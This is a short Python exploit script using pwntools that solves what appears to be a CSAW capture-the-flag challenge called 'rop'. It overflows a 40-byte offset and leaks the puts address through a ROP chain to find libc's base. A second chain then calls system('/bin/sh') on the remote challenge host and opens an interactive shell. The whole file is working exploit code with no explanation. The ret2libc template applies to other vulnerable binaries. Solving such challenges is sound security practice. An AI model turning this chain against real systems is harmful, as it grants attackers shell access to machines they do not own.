from pwn import *

elf = ELF("rop")
libc = ELF("./libc-2.27.so")
rop = ROP(elf.path)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
offset = 32 + 8
r = remote('pwn.chal.csaw.io', 5016)

payload = b'A' * offset
payload += p64(pop_rdi)
payload += p64(elf.got['puts'])
payload += p64(elf.plt['puts'])
payload += p64(elf.symbols['main'])

r.recvuntil("Hello\n")
r.sendline(payload)

leak = u64(r.recv(6).ljust(8, b'\x00'))
libc_base = leak - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

log.info("leak --> %s" % hex(leak))
log.info("libc_base --> %s", hex(libc_base))
log.info("system --> %s" % hex(system))

payload = b'A' * offset
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)

r.sendline(payload)
r.interactive()
